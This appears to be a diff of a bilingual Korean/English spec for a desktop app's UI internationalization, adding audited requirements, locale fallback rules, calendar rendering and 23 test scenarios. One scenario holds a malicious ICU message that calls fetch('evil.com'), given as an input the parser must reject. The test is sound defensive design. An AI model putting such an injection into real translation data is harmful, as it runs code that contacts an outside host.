@@ -1,15 +1,16 @@
 ---
 id: SPEC-GOOSE-I18N-001
-version: 0.1.0
-status: Planned
-created: 2026-04-22
-updated: 2026-04-22
+version: 0.2.0
+status: draft
+created_at: "2026-04-22"
+updated_at: "2026-04-25"
 author: manager-spec
 priority: P0
 issue_number: null
 phase: 6
 size: 중(M)
 lifecycle: spec-anchored
+labels: [i18n, localization, ui, rtl, icu, phase-6]
 ---
 
 # SPEC-GOOSE-I18N-001 — UI Internationalization (20+ Languages, Plurals, RTL)
@@ -18,6 +19,7 @@ lifecycle: spec-anchored
 
 | 버전 | 날짜 | 변경 사유 | 담당 |
 |-----|------|---------|------|
+| 0.2.0 | 2026-04-25 | 감사 리포트(mass-20260425/I18N-001-audit.md) 반영: frontmatter `labels` 채움 및 `status: draft`로 정규화, §5 header "Test Scenarios"로 변경 + "Verifies: REQ-I18N-XXX" 라인 추가(D3), REQ-013/015/016 Unwanted 정형화(D4), REQ-018 `may`→조건부 `shall`(D5), REQ-016 Tier 1/Tier 2 범위로 한정(D8), REQ-019(BCP 47 regional fallback chain) 신설(D9), 누락 AC 6개 추가(D7), REQ-020(calendar-system 렌더링) 신설(D14), gender/context-dependent 번역은 Exclusions 명시(D10/D11), CI exit code 일관화(D13). | manager-spec |
 | 0.1.0 | 2026-04-22 | 초안 작성. v5.0 ROADMAP Phase 6 Localization 시리즈 2번째. LOCALE-001이 제공하는 `primary_language`를 소비하여 20+ 언어 UI 번역 제공. Hermes 수준 다국어. | manager-spec |
 
 ---
@@ -151,7 +153,7 @@ Desktop(Tailwind 4.x + logical properties) + Mobile(React Native `I18nManager.is
      - ICU 문법 검증
      - 사용 안 된 키 감지
      - 미번역 키(Tier 1만, Tier 2+는 fallback 허용)
-   - exit code 1로 CI fail
+   - Exit code: `0`(pass), `1`(Tier 1 누락 또는 ICU 구문 오류, CI fail), `2`(Tier 2 누락 또는 WARN만, CI pass). §6.7과 일관. CI 파이프라인은 exit code `1`만 블로킹한다.
 10. **LLM 자동번역 파이프라인 (Tier 3)**:
     - 새 언어 코드 요청 시 `en.yaml` 전체를 ADAPTER-001에 전달
     - 응답을 `{new_lang}.yaml`로 저장
@@ -205,98 +207,173 @@ Desktop(Tailwind 4.x + logical properties) + Mobile(React Native `I18nManager.is
 
 ### 4.4 Unwanted Behavior
 
-**REQ-I18N-013 [Unwanted]** — The translator **shall not** execute arbitrary code inside ICU message values; only declarative ICU syntax is parsed, function calls are rejected.
+**REQ-I18N-013 [Unwanted]** — **If** a translation value contains non-declarative ICU constructs (e.g., function call syntax, JavaScript expressions, or side-effect invocations), **then** the translator **shall** reject the construct, skip the affected key, and emit one security-audit log entry.
 
 **REQ-I18N-014 [Unwanted]** — **If** a translation YAML file contains a key with a type mismatch (e.g., integer expected, string provided), **then** the loader **shall** log an error and skip that file without crashing the load.
 
-**REQ-I18N-015 [Unwanted]** — The LLM auto-translation pipeline **shall not** send user-identifying context to the LLM; only the source English string and target language code are transmitted.
+**REQ-I18N-015 [Unwanted]** — **If** the LLM auto-translation pipeline (ADAPTER-001) is invoked, **then** the pipeline **shall** transmit only the source English string and the target BCP 47 language code — no user-identifying context, session state, telemetry, or secondary-language data **shall** be included in the request payload.
 
-**REQ-I18N-016 [Unwanted]** — The i18n system **shall not** depend on network I/O in production; all Tier 1/Tier 2 bundles are bundled at build time.
+**REQ-I18N-016 [Unwanted]** — **If** the i18n system is running in a production build and is loading a Tier 1 or Tier 2 locale bundle, **then** the loader **shall not** perform any network I/O; Tier 1/Tier 2 bundles **shall** be embedded at build time. Tier 3 LLM auto-translation (REQ-I18N-008) is explicitly scoped out of this prohibition and requires explicit user opt-in plus network availability.
 
 ### 4.5 Optional
 
 **REQ-I18N-017 [Optional]** — **Where** the user provides a custom translation file via CLI (`goose i18n override --file my-korean.yaml`), the override **shall** take priority over bundled translations for the matching language.
 
-**REQ-I18N-018 [Optional]** — **Where** the active language is Tier 1, the UI **may** offer an "Improve this translation" inline feedback button that submits suggestions to the GitHub repository.
+**REQ-I18N-018 [Optional]** — **Where** the active language is Tier 1 AND the user has enabled the `feedback.translation_suggestions` setting in CONFIG-001, the UI **shall** offer an "Improve this translation" inline feedback button that submits suggestions to the GitHub repository.
+
+### 4.6 Addenda (v0.2.0 Event-Driven)
+
+본 섹션은 v0.2.0에서 감사 리포트(D9, D14) 반영을 위해 추가된 Event-Driven REQ이며, REQ 번호 재배치 금지 원칙에 따라 §4.2와 통합하지 않고 별도 섹션으로 유지한다.
+
+**REQ-I18N-019 [Event-Driven]** — **When** the primary language bundle (e.g., `fr-CA`) is missing but a regional parent tag (e.g., `fr`) exists in the locale directory, the loader **shall** resolve the fallback chain by BCP 47 truncation rules (e.g., `fr-CA` → `fr` → `en-US`), loading the first available parent; **if** no parent is available, the loader **shall** fall back to `en-US` as defined in REQ-I18N-005.
+
+**REQ-I18N-020 [Event-Driven]** — **When** a date or calendar-related format call is invoked and `LocaleContext.calendar_system` is non-empty (e.g., `japanese`, `buddhist`, `persian`), the formatter **shall** render dates using the specified calendar system via `Intl.DateTimeFormat` (`calendar` option, frontend) or `golang.org/x/text/date` calendar extension (backend); **if** `calendar_system` is empty, the Gregorian calendar **shall** be used.
 
 ---
 
-## 5. 수용 기준 (Acceptance Criteria)
+## 5. 테스트 시나리오 (Test Scenarios)
+
+본 섹션의 Given/When/Then 시나리오들은 EARS 요구사항(§4)을 검증하기 위한 **테스트 설계**이며, 요구사항 자체는 §4에 정의되어 있다. 각 시나리오는 "Verifies: REQ-I18N-XXX" 라인으로 상응 REQ를 명시한다.
+
+**Format declaration**: 아래 23개 시나리오는 Given/When/Then 테스트 설계 포맷을 사용한다. EARS 형식의 normative 요구사항은 §4 (REQ-I18N-001..020)에 위치한다.
 
 **AC-I18N-001 — 기본 키 번역**
 - **Given** ko 번들에 `common.yaml: greeting: "안녕하세요"`, en 번들에 `greeting: "Hello"`
 - **When** `LocaleContext.primary_language = "ko-KR"`, `t("common:greeting")`
 - **Then** `"안녕하세요"` 반환
+- **Verifies**: REQ-I18N-001, REQ-I18N-002, REQ-I18N-005
 
 **AC-I18N-002 — 영어 fallback**
 - **Given** fr 번들에 `greeting` 키 없음, en에는 있음
 - **When** `primary_language = "fr-FR"`, `t("common:greeting")`
 - **Then** `"Hello"` 반환 + 개발 모드 콘솔에 `[MISSING: common:greeting for fr]` warn
+- **Verifies**: REQ-I18N-002
 
 **AC-I18N-003 — ICU 플루럴 (한국어)**
 - **Given** `messages: "{count, plural, =0 {메시지 없음} other {#개의 메시지}}"`
 - **When** `t("common:messages", {count: 5})`
 - **Then** `"5개의 메시지"` (한국어는 other만)
+- **Verifies**: REQ-I18N-006
 
 **AC-I18N-004 — ICU 플루럴 (영어)**
 - **Given** `messages: "{count, plural, =0 {no messages} one {# message} other {# messages}}"`
 - **When** `t("common:messages", {count: 1})` in `en`, `{count: 5}` in `en`
 - **Then** `"1 message"`, `"5 messages"`
+- **Verifies**: REQ-I18N-006
 
 **AC-I18N-005 — ICU 플루럴 (러시아어 4 form)**
 - **Given** ru 번들에 `messages: "{count, plural, =0 {нет сообщений} one {# сообщение} few {# сообщения} many {# сообщений} other {# сообщений}}"`
 - **When** `t("common:messages", {count: 21})` = one(21), `{count: 23}` = few(23), `{count: 25}` = many(25)
 - **Then** 각각 `"21 сообщение"`, `"23 сообщения"`, `"25 сообщений"`
+- **Verifies**: REQ-I18N-006
 
 **AC-I18N-006 — RTL 전환 (아랍어)**
 - **Given** 현재 `primary_language = "en-US"`, Desktop 실행 중
 - **When** 사용자가 Preferences에서 `ar-SA`로 변경
 - **Then** `document.documentElement.dir === "rtl"`, 메인 레이아웃의 sidebar가 우측으로 이동, 사이드바 내부 아이콘이 대칭화
+- **Verifies**: REQ-I18N-007
 
 **AC-I18N-007 — 날짜 포맷**
 - **Given** `primary_language = "ko-KR"`, 날짜 `2026-04-22T10:30:00+09:00`
 - **When** `formatDate(date, "long")`
 - **Then** `"2026년 4월 22일 수요일"`
+- **Verifies**: REQ-I18N-001 (Intl.DateTimeFormat 결정론적 렌더링)
 
 **AC-I18N-008 — 통화 포맷 (LOCALE 연계)**
 - **Given** `LocaleContext.currency = "KRW"`, 금액 `1_250_000`, `primary_language = "ko-KR"`
 - **When** `formatCurrency(amount)`
 - **Then** `"₩1,250,000"`
+- **Verifies**: REQ-I18N-001
 
 **AC-I18N-009 — 상대 시간**
 - **Given** `primary_language = "ja-JP"`, 현재시각 - 3600초
 - **When** `formatRelativeTime(past)`
 - **Then** `"1時間前"`
+- **Verifies**: REQ-I18N-001
 
 **AC-I18N-010 — Tier 3 자동번역 파이프라인**
 - **Given** 사용자가 스와힐리어 `sw-TZ` 요청, 해당 번들 없음
 - **When** i18n 시스템이 감지
 - **Then** ADAPTER-001 호출 → `locales/sw/*.yaml` 생성, 각 키에 `_machine_translated: true` 메타 추가, UI에 "자동번역" 배지 표시
+- **Verifies**: REQ-I18N-008, REQ-I18N-010
 
-**AC-I18N-011 — 누락 키 CI lint**
+**AC-I18N-011 — 누락 키 CI lint (Tier 1, exit 1)**
 - **Given** ko 번들에 `common:farewell` 키 누락, en에는 존재
 - **When** `goose i18n lint`
-- **Then** exit code 1, 출력에 `missing key "common:farewell" in ko`
+- **Then** exit code 1 (CI fail), 출력에 `missing key "common:farewell" in ko`
+- **Verifies**: REQ-I18N-004
 
 **AC-I18N-012 — 기술용어 보존 (secondary language)**
 - **Given** `primary="ko-KR"`, `secondary="en-US"`, 번역 `"{term} 함수를 Promise로 감싸주세요"`, `{term: "async function"}`
 - **When** `t(...)`
 - **Then** `"async function 함수를 Promise로 감싸주세요"` (영어 기술용어 유지)
+- **Verifies**: REQ-I18N-012
 
 **AC-I18N-013 — Hot reload (개발)**
 - **Given** dev 모드에서 `locales/ko/common.yaml`의 `greeting` 값을 수정·저장
 - **When** 파일 저장 후
 - **Then** 5초 이내 UI에 새 값 반영 (페이지 reload 불필요)
+- **Verifies**: REQ-I18N-009
 
 **AC-I18N-014 — ICU 코드 실행 거부**
 - **Given** 악의적 YAML에 `evil: "{eval, function, () => fetch('evil.com')}"`
 - **When** 파싱
-- **Then** 파서가 reject, 해당 키 로드 skip, security log 1건
+- **Then** 파서가 reject, 해당 키 로드 skip, security log 1건 기록
+- **Verifies**: REQ-I18N-013
 
 **AC-I18N-015 — 20+ 언어 번들 존재 확인**
 - **Given** 릴리스 빌드
 - **When** `packages/goose-desktop/locales/` 디렉토리 스캔
 - **Then** en, ko, ja, zh-CN, es, fr, de, pt-BR, ru, vi, th, id, ar, hi, tr, pl 최소 16개 언어 디렉토리 존재 (Tier 1 + Tier 2)
+- **Verifies**: REQ-I18N-004, REQ-I18N-016
+
+**AC-I18N-016 — UTF-8 / BOM / CRLF 거부**
+- **Given** `locales/ko/common.yaml`이 UTF-8 BOM (`0xEF 0xBB 0xBF`)으로 시작하거나 CRLF (`\r\n`) 줄끝을 포함함
+- **When** Loader.Load() 실행
+- **Then** 해당 파일은 로드 skip, 에러 로그 1건(`rejected: BOM present` 또는 `rejected: CRLF line endings in <path>`), 나머지 언어 번들은 정상 로드되어 애플리케이션이 크래시 없이 기동
+- **Verifies**: REQ-I18N-003
+
+**AC-I18N-017 — 번들 로드 중 동기 영어 fallback**
+- **Given** i18next 번들이 아직 네트워크/파일시스템에서 비동기 로드 중 (`i18next.isInitialized === false`)
+- **When** UI 컴포넌트가 `t("common:greeting")`을 동기적으로 호출
+- **Then** `"Hello"` (en 동기 fallback 값) 반환, Promise/undefined 반환 없음, 컴포넌트는 로드 완료 후 재렌더시 번역 값으로 대체
+- **Verifies**: REQ-I18N-011
+
+**AC-I18N-018 — YAML 타입 미스매치 허용 (크래시 없음)**
+- **Given** `locales/de/common.yaml`에 `greeting: 42` (integer, 기대 타입 string)
+- **When** Loader.Load() 실행
+- **Then** 해당 파일 로드 skip, `[ERROR] de/common.yaml: type mismatch at key "greeting" (expected string, got int), file skipped` 로그, 다른 언어(en/ko/...) 번들은 정상 로드, 애플리케이션은 `de` 요청 시 en fallback으로 동작
+- **Verifies**: REQ-I18N-014
+
+**AC-I18N-019 — LLM 파이프라인 PII 차단**
+- **Given** 사용자가 Tier 3 언어 `sw-TZ`를 요청, `LocaleContext.secondary_language="en-US"`, 사용자 이름/이메일/세션ID가 존재
+- **When** ADAPTER-001 호출이 수행되어 아웃바운드 HTTP 요청이 캡처됨
+- **Then** 요청 페이로드의 키/값을 inspection한 결과 `source_text`(영어 원문)와 `target_lang="sw-TZ"` 두 필드만 존재, 사용자 이름/이메일/세션ID/secondary_language/텔레메트리 어떤 식별 정보도 포함되지 않음
+- **Verifies**: REQ-I18N-015
+
+**AC-I18N-020 — 프로덕션 빌드 Tier 1/2 네트워크 격리**
+- **Given** 프로덕션 빌드된 Desktop 앱이 네트워크가 완전히 차단된 환경에서 기동, 사용자 `primary_language="ko-KR"`
+- **When** 앱 시작 및 UI 렌더
+- **Then** Tier 1 `ko` 번들이 embedded 자산에서 로드되어 모든 UI 텍스트가 정상 표시, 아웃바운드 소켓 연결 시도 0건, Tier 3 자동번역 트리거 없음(사용자가 명시적 opt-in 하지 않았으므로)
+- **Verifies**: REQ-I18N-016
+
+**AC-I18N-021 — CLI 오버라이드 우선순위**
+- **Given** 번들 `locales/ko/common.yaml`에 `greeting: "안녕하세요"`, 사용자가 `goose i18n override --file custom-ko.yaml --lang ko` 실행, `custom-ko.yaml`의 `greeting: "반갑습니다"`
+- **When** 앱이 `t("common:greeting")` 호출 (`primary_language="ko-KR"`)
+- **Then** `"반갑습니다"` 반환(override 우선), 오버라이드되지 않은 다른 키는 번들 기본값 사용
+- **Verifies**: REQ-I18N-017
+
+**AC-I18N-022 — BCP 47 regional fallback chain**
+- **Given** `locales/` 디렉토리에 `fr/common.yaml`은 존재, `fr-CA/common.yaml`은 부재, `primary_language = "fr-CA"`
+- **When** Loader가 `fr-CA` 번들 요청
+- **Then** truncation 체인에 의해 `fr` 번들이 로드됨 (`fr-CA` → `fr` 순). 만약 `fr`도 부재하면 `en-US`로 최종 fallback
+- **Verifies**: REQ-I18N-019
+
+**AC-I18N-023 — Calendar system 기반 날짜 렌더**
+- **Given** `LocaleContext.calendar_system = "japanese"`, `primary_language = "ja-JP"`, 날짜 `2026-04-22`
+- **When** `formatDate(date, "long")`
+- **Then** 일본 황실력으로 렌더된 문자열(예: `"令和8年4月22日"`). `calendar_system`이 빈 문자열이면 Gregorian `"2026年4月22日"`
+- **Verifies**: REQ-I18N-020
 
 ---
 
@@ -598,9 +675,11 @@ Exit code: `0`(pass), `1`(Tier 1 누락 또는 구문 오류), `2`(Tier 2 누락
 - 본 SPEC은 **Unicode BiDi 알고리즘을 직접 구현하지 않는다**. 브라우저/RN 내장에 위임.
 - 본 SPEC은 **WebAssembly ICU를 번들하지 않는다**. 네이티브 구현만.
 - 본 SPEC은 **번역 품질 자동 평가를 수행하지 않는다**.
-- 본 SPEC은 **릴리스 빌드에서 네트워크 번들 로딩을 허용하지 않는다**(REQ-I18N-016).
+- 본 SPEC은 **릴리스 빌드에서 네트워크 번들 로딩을 허용하지 않는다**(REQ-I18N-016, Tier 1/Tier 2 한정).
 - 본 SPEC은 **LLM에 사용자 PII를 전송하지 않는다**(REQ-I18N-015).
 - 본 SPEC은 **Tier 3 자동번역 결과를 자동 커밋하지 않는다**. PR 생성 또는 사용자 로컬 저장만.
+- 본 SPEC은 **ICU `select`를 활용한 성별 인지(gender-aware) 번역을 v0.1 범위에 포함하지 않는다**. §2.4에서 동기로만 언급되며, 번역자가 ICU `select` 구문을 수동으로 작성하면 엔진이 렌더링은 하지만, 성별 감지 자동화/프로필 연동/성중립 언어(ko/ja) 대응 규칙은 향후 SPEC에서 다룬다. R7 참조.
+- 본 SPEC은 **컨텍스트 의존 번역(context-dependent translation) — i18next `_context` suffix 등으로 같은 키의 의미 분기(verb "close" vs adjective "close")를 지원하지 않는다**. 필요 시 번역자가 별도 키로 분리하여 작성해야 한다. v1.0+ 별도 SPEC에서 다룰 수 있음.
 
 ---
 
